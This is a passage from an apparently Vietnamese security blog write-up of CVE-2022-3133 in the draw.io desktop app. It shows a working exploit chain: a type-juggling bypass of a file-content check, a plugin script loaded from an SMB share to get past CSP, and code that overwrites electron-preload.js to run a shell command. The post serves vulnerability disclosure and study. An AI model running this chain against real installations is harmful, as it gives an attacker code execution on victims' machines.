</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">ipcMain</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s2">&#34;rendererReq&#34;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">event</span><span class="p">,</span> <span class="nx">args</span><span class="p">)</span> <span class="p">=&gt;</span> 
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">ret</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">        <span class="k">switch</span><span class="p">(</span><span class="nx">args</span><span class="p">.</span><span class="nx">action</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">case</span> <span class="s1">&#39;writeFile&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nx">ret</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">writeFile</span><span class="p">(</span><span class="nx">args</span><span class="p">.</span><span class="nx">path</span><span class="p">,</span> <span class="nx">args</span><span class="p">.</span><span class="nx">data</span><span class="p">,</span> <span class="nx">args</span><span class="p">.</span><span class="nx">enc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// ...
</span></span></span></code></pre></div><p>trong ƒë√≥ ƒë√°ng ch√∫ √Ω l√† <code>writeFile</code> action nh·∫≠n v√†o tham s·ªë l√† <code>path</code>, <code>data</code>, <code>enc</code>. ƒê·ªìng th·ªùi, ·ªü <code>electron-preloads.js</code> expose API <code>electron</code> cho ph√©p g·ªçi <code>rendererReq</code> channel t·ª´ renderer process nh∆∞ sau</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">contextBridge</span><span class="p">.</span><span class="nx">exposeInMainWorld</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;electron&#39;</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">request</span><span class="o">:</span> <span class="p">(</span><span class="nx">msg</span><span class="p">,</span> <span class="nx">callback</span><span class="p">,</span> <span class="nx">error</span><span class="p">)</span> <span class="p">=&gt;</span> 
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">msg</span><span class="p">.</span><span class="nx">reqId</span> <span class="o">=</span> <span class="nx">reqId</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">reqInfo</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">reqId</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="nx">callback</span><span class="o">:</span> <span class="nx">callback</span><span class="p">,</span> <span class="nx">error</span><span class="o">:</span> <span class="nx">error</span><span class="p">};</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">            <span class="c1">//TODO Maybe a special function for this better than this hack?
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">//File watch special case where the callback is called multiple times
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">action</span> <span class="o">==</span> <span class="s1">&#39;watchFile&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">fileChangedListeners</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">path</span><span class="p">]</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">listener</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">delete</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">listener</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">            <span class="nx">ipcRenderer</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;rendererReq&#39;</span><span class="p">,</span> <span class="nx">msg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// ...
</span></span></span></code></pre></div><p>=&gt; √ù t∆∞·ªüng ·ªü ƒë√¢y s·∫Ω l√† l·∫°m d·ª•ng ch·ª©c nƒÉng <code>writeFile</code> n√†y ƒë·ªÉ ghi ƒë√® thay ƒë·ªïi n·ªôi dung c·ªßa <code>electron-preload.js</code> ƒë·ªÉ tr·ª±c ti·∫øp th·ª±c thi m√£ NodeJS.</p>
<h4 id="type-juggling-bypass-checkfilecontent">#Type juggling bypass checkFileContent<a hidden class="anchor" aria-hidden="true" href="#type-juggling-bypass-checkfilecontent">#</a></h4>
<p>H√†m <code>writeFile</code> ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a nh∆∞ sau:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">async</span> <span class="kd">function</span> <span class="nx">writeFile</span><span class="p">(</span><span class="nx">path</span><span class="p">,</span> <span class="nx">data</span><span class="p">,</span> <span class="nx">enc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">checkFileContent</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">enc</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;Invalid file data&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kr">await</span> <span class="nx">fsProm</span><span class="p">.</span><span class="nx">writeFile</span><span class="p">(</span><span class="nx">path</span><span class="p">,</span> <span class="nx">data</span><span class="p">,</span> <span class="nx">enc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="c1">// ...
</span></span></span></code></pre></div><p>trong ƒë√≥, h√†m <code>checkFileContent</code> ki·ªÉm tra content type t·ª´ d·ªØ li·ªáu ƒë∆∞a v√†o, m·ª•c ti√™u c·ªßa ch√∫ng ta l√† ph·∫£i ch√®n n·ªôi dung javascript h·ª£p l·ªá v√†o <code>electron-preload.js</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">checkFileContent</span><span class="p">(</span><span class="nx">body</span><span class="p">,</span> <span class="nx">enc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">body</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">head</span><span class="p">,</span> <span class="nx">headBinay</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">         
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">body</span> <span class="o">===</span> <span class="s1">&#39;string&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">enc</span> <span class="o">==</span> <span class="s1">&#39;base64&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">headBinay</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">body</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">22</span><span class="p">),</span> <span class="s1">&#39;base64&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nx">head</span> <span class="o">=</span> <span class="nx">headBinay</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">head</span> <span class="o">=</span> <span class="nx">body</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nx">headBinay</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">head</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kd">let</span> <span class="nx">c1</span> <span class="o">=</span> <span class="nx">head</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="nx">c2</span> <span class="o">=</span> <span class="nx">head</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="nx">c3</span> <span class="o">=</span> <span class="nx">head</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="nx">c4</span> <span class="o">=</span> <span class="nx">head</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="p">...</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">c1</span> <span class="o">==</span> <span class="s1">&#39;&lt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// text/html
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="p">(</span><span class="nx">c2</span> <span class="o">==</span> <span class="s1">&#39;!&#39;</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">// application/xml
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="p">(</span><span class="nx">c2</span> <span class="o">==</span> <span class="s1">&#39;?&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">c3</span> <span class="o">==</span> <span class="s1">&#39;x&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">c4</span> <span class="o">==</span> <span class="s1">&#39;m&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">c5</span> <span class="o">==</span> <span class="s1">&#39;l&#39;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&amp;&amp;</span> <span class="nx">c6</span> <span class="o">==</span> <span class="s1">&#39; &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// ...
</span></span></span></code></pre></div><p>·ªû ƒë√¢y ta c√≥ th·ªÉ th·∫•y r·∫±ng d·ªØ li·ªáu mong mu·ªën t·ª´ ƒë·∫ßu v√†o l√† c√°c file ƒë·ªãnh d·∫°ng nh∆∞ <code>text/html, application/xml, application/pdf, image/*</code>. Nghƒ©a l√† nh·ªØng bytes ƒë·∫ßu ti√™n c·ªßa c√°c ƒë·ªãnh d·∫°ng n√†y th∆∞·ªùng b·∫Øt ƒë·∫ßu b·∫±ng nh·ªØng k√Ω t·ª± ƒë·∫∑c bi·ªát, v√¨ l√Ω do n√†y n√™n s·∫Ω g√¢y ra l·ªói syntax khi vi·∫øt v√†o m·ªôt file javascript.</p>
<p>M·ªôt ƒëi·ªÅu n·ªØa l√† ch·ªâ l·∫•y 16 bytes header t·ª´ input ƒë·ªÉ validate n·∫øu kh√¥ng ph·∫£i l√† d·∫°ng base64, c√≤n n·∫øu l√† base64 th√¨ l·∫•y 22 k√Ω t·ª± ƒë·∫ßu ƒë·ªÉ ƒëem ƒëi decode v√† ti·∫øp theo l√† ƒëem ƒëi check.</p>
<p>M·ª•c ti√™u c·ªßa ch√∫ng ta ƒë∆°n gi·∫£n ch·ªâ l√† l√†m cho h√†m n√†y tr·∫£ v·ªÅ <code>true</code> l√† ƒë∆∞·ª£c, sau ƒë√≥ d·ªØ li·ªáu s·∫Ω ƒë∆∞·ª£c ƒë∆∞a v√†o <code>fsProm.writeFile</code> ƒë·ªÉ ghi xu·ªëng t·ªáp. V·∫≠y bug ·ªü ƒë√¢y l√† g√¨???</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">checkFileContent</span><span class="p">(</span><span class="nx">body</span><span class="p">,</span> <span class="nx">enc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">body</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">head</span><span class="p">,</span> <span class="nx">headBinay</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">         
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">body</span> <span class="o">===</span> <span class="s1">&#39;string&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">enc</span> <span class="o">==</span> <span class="s1">&#39;base64&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1">// ...
</span></span></span></code></pre></div><p>L·ªó h·ªïng type juggling xu·∫•t hi·ªán ·ªü <code>enc == 'base64'</code>, b·ªüi v√¨:</p>
<blockquote>
<p>‚Äúbase64‚Äù == ‚Äúbase64‚Äù<br>
true<br>
[‚Äúbase64‚Äù] == ‚Äúbase64‚Äù<br>
true</p>
</blockquote>
<p>V·∫≠y n·∫øu ta truy·ªÅn v√†o tham s·ªë <code>enc = [&quot;base64&quot;]</code> th√¨ s·∫Ω c√≥ √Ω nghƒ©a g√¨??? M·ªçi th·ª© ƒë·ªÅu c√≥ l√Ω do c·ªßa n√≥ =)))
<img loading="lazy" src="/images/cve-2022-3133-drawio-xss-to-rce/4.png"></p>
<p>V√¨ h√†m <code>fs.writeFile</code> nh·∫≠n v√†o tham s·ªë option l√† <code>string ho·∫∑c object</code>, n·∫øu option <code>encoding = &quot;base64&quot;</code> th√¨ input s·∫Ω decode base64 r·ªìi m·ªõi ƒë∆∞·ª£c ghi xu·ªëng file, c√≤n n·∫øu <code>encoding = [&quot;base64&quot;]</code> th√¨ d·ªØ li·ªáu s·∫Ω kh√¥ng c·∫ßn decode v√¨ <code>default = utf-8</code> m√† ghi th·∫≥ng xu·ªëng file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">fsProm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs/promises&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">fsProm</span><span class="p">.</span><span class="nx">writeFile</span><span class="p">(</span><span class="s2">&#34;/tmp/output&#34;</span><span class="p">,</span> <span class="s2">&#34;PGh0bWwxMzMzMzMzMzMzMzM=&#34;</span><span class="p">,</span> <span class="s2">&#34;base64&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1">// Output: &lt;html133333333333
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">fsProm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs/promises&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">fsProm</span><span class="p">.</span><span class="nx">writeFile</span><span class="p">(</span><span class="s2">&#34;/tmp/output&#34;</span><span class="p">,</span> <span class="s2">&#34;PGh0bWwxMzMzMzMzMzMzMzM=&#34;</span><span class="p">,</span> <span class="p">[</span><span class="s2">&#34;base64&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1">// Output: PGh0bWwxMzMzMzMzMzMzMzM=
</span></span></span></code></pre></div><p>Nh∆∞ v·∫≠y l√† ƒë√£ r√µ, n·∫øu ta truy·ªÅn v√†o data l√† chu·ªói b·∫Øt ƒë·∫ßu b·∫±ng <code>&lt;html</code> d·∫°ng <code>base64</code> ·ªü 22 k√Ω t·ª± ƒë·∫ßu v·ªõi <code>enc = [&quot;base64&quot;]</code> th√¨ khi validate s·∫Ω b·ªã base64 decode nh∆∞ng ƒë·∫øn h√†m <code>fsProm.write</code> s·∫Ω khi tr·ª±c ti·∫øp chu·ªói base64 xu·ªëng file v√† c√≥ th·ªÉ control ƒë∆∞·ª£c code ·ªü ph√≠a sau.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">PGh0bWxhYWFhYWFhYWFhYWE</span><span class="o">=</span><span class="mi">1337</span><span class="p">;</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;calc&#39;</span><span class="p">);</span><span class="c1">//
</span></span></span></code></pre></div><h4 id="find-the-webroot">#Find the webroot<a hidden class="anchor" aria-hidden="true" href="#find-the-webroot">#</a></h4>
<p>May m·∫Øn l√† <code>rendererReq</code> channel ·ªü <code>ipcMain</code> c√≥ <code>getCurDir</code> action, action n√†y s·∫Ω th·ª±c thi h√†m <code>getCurDir</code> v√† tr·∫£ v·ªÅ ƒë∆∞·ªùng d·∫´n hi·ªán t·∫°i =&gt; ƒê∆∞·ªùng d·∫´n n√†y c≈©ng l√† n∆°i ch·ª©a <code>electron-preload.js</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">ipcMain</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s2">&#34;rendererReq&#34;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">event</span><span class="p">,</span> <span class="nx">args</span><span class="p">)</span> <span class="p">=&gt;</span> 
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">ret</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">        <span class="k">switch</span><span class="p">(</span><span class="nx">args</span><span class="p">.</span><span class="nx">action</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">case</span> <span class="s1">&#39;getCurDir&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="nx">ret</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">getCurDir</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// ...
</span></span></span></code></pre></div><h4 id="look-for-xss-vulnerabilities">#Look for XSS vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#look-for-xss-vulnerabilities">#</a></h4>
<p><img loading="lazy" src="/images/cve-2022-3133-drawio-xss-to-rce/5.png">
Theo nh∆∞ document th√¨ c√°c plugin c√≥ th·ªÉ ƒë∆∞·ª£c load th√¥ng qua vi·ªác c·∫•u h√¨nh m·ªôt danh s√°ch c√°c t√™n plugin tr√™n UI.</p>
<p>Ch·∫≥ng h·∫°n nh∆∞ ta c·∫•u h√¨nh nh∆∞ th·∫ø n√†y:
<img loading="lazy" src="/images/cve-2022-3133-drawio-xss-to-rce/6.png"></p>
<p>th√¨ plugin <code>voice</code> s·∫Ω ƒë∆∞·ª£c load
<img loading="lazy" src="/images/cve-2022-3133-drawio-xss-to-rce/7.png"></p>
<p>V√¨ l√Ω do b·ªã h·∫°n ch·∫ø b·ªüi CSP n√™n ta kh√¥ng th·ªÉ load b·∫•t k·ª≥ extension n√†o kh√°c t√πy √Ω</p>
<pre tabindex="0"><code>default-src &#39;self&#39;; connect-src &#39;self&#39; https://fonts.googleapis.com https://fonts.gstatic.com; img-src * data:; media-src *; font-src *; style-src &#39;self&#39; &#39;unsafe-inline&#39; https://fonts.googleapis.com
</code></pre><p>n√™n c√°c script ch·ªâ c√≥ th·ªÉ ƒë∆∞·ª£c load t·ª´ <code>self</code> nh∆∞ng ta c√≥ th·ªÉ ho√†n to√†n bypass ƒë∆∞·ª£c CSP n√†y th√¥ng qua load m·ªôt script t·ª´ SMB server, v·∫•n ƒë·ªÅ n√†y ƒë√£ ƒë∆∞·ª£c n√≥i r√µ t·ª´ b·∫£n report <a href="https://huntr.dev/bounties/911a4ada-7fd6-467a-a464-b88604b16ffc/">https://huntr.dev/bounties/911a4ada-7fd6-467a-a464-b88604b16ffc/</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;plugins&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;\\\\10.69.157.158\\js-server\\exploit.js&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h4 id="exploit">#Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h4>
<p>Chain m·ªçi th·ª© l·∫°i th√¨ √Ω t∆∞·ªüng khai th√°c l√† l·∫°m d·ª•ng l·ªó h·ªïng XSS th√¥ng qua tamper configure load malicous script t·ª´ SMB server ƒë·ªÉ g·ªçi c√°c APIs t·ª´ renderer process, th·ª±c hi·ªán l·∫ßn l∆∞·ª£t c√°c action <code>getCurDir</code>, <code>writeFile</code> ƒë·ªÉ ghi ƒë√® <code>electron-preload.script</code>. Sau ƒë√≥, th·ª±c hi·ªán <code>electron.sendMessage('newfile')</code> ƒë·ªÉ t·∫°o ra m·ªôt renderer process m·ªõi, ƒë·ªìng th·ªùi ƒë·ªÉ <code>electron-preload.js</code> m·ªõi ƒë∆∞·ª£c load v√† RCE.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">electron</span><span class="p">.</span><span class="nx">request</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">action</span><span class="o">:</span> <span class="s2">&#34;getCurDir&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">},</span> <span class="p">(</span><span class="nx">d</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">electron</span><span class="p">.</span><span class="nx">request</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="nx">action</span><span class="o">:</span> <span class="s2">&#34;writeFile&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">path</span><span class="o">:</span> <span class="sb">`</span><span class="si">${</span><span class="nx">d</span><span class="si">}</span><span class="sb">/electron-preload.js`</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">data</span><span class="o">:</span> <span class="s2">&#34;PGh0bWxYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhY=1;require(&#39;child_process&#39;).exec(&#39;calc&#39;);//&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">enc</span><span class="o">:</span> <span class="p">[</span><span class="s2">&#34;base64&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="p">(</span><span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">electron</span><span class="p">.</span><span class="nx">sendMessage</span><span class="p">(</span><span class="s1">&#39;newfile&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">width</span><span class="o">:</span> <span class="mi">100</span><span class="p">,</span> <span class="nx">height</span><span class="o">:</span> <span class="mi">100</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/A__d6f-iuxE?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
    </div>

<h3 id="references">#References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h3>
<ul>
<li><a href="https://huntr.dev/bounties/2d93052f-efc6-4647-9a6d-8b08dc251223/">https://huntr.dev/bounties/2d93052f-efc6-4647-9a6d-8b08dc251223/</a></li>
<li><a href="https://huntr.dev/bounties/911a4ada-7fd6-467a-a464-b88604b16ffc/">https://huntr.dev/bounties/911a4ada-7fd6-467a-a464-b88604b16ffc/</a></li>
<li><a href="https://deepsec.net/docs/Slides/2021/Hacking_Modern_Desktop_apps_with_XSS_and_RCE_Abraham_Aranguren.pdf">https://deepsec.net/docs/Slides/2021/Hacking_Modern_Desktop_apps_with_XSS_and_RCE_Abraham_Aranguren.pdf</a></li>
<li><a href="https://www.electronjs.org/docs/latest/tutorial/ipc">https://www.electronjs.org/docs/latest/tutorial/ipc</a></li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://nhienit2010.github.io/tags/research/">Research</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://nhienit2010.github.io/posts/cve-2024-5443-path-traversal-to-rce/">
    <span class="title">¬´ Prev</span>
    <br>
    <span>CVE-2024-5443: Path Traversal Leads to RCE in parisneo/lollms</span>
  </a>
</nav>



  </footer><div id="disqus_thread"></div>
<script>
(function() {
var d = document, s = d.createElement('script');
s.src = 'https://nhienit.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

</article>
    </main>
    
<footer class="footer">
        <span>¬©nhienit</span> ¬∑ 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu');
    if (menu) {
        
        const scrollPosition = localStorage.getItem("menu-scroll-position");
        if (scrollPosition) {
            menu.scrollLeft = parseInt(scrollPosition, 10);
        }
        
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
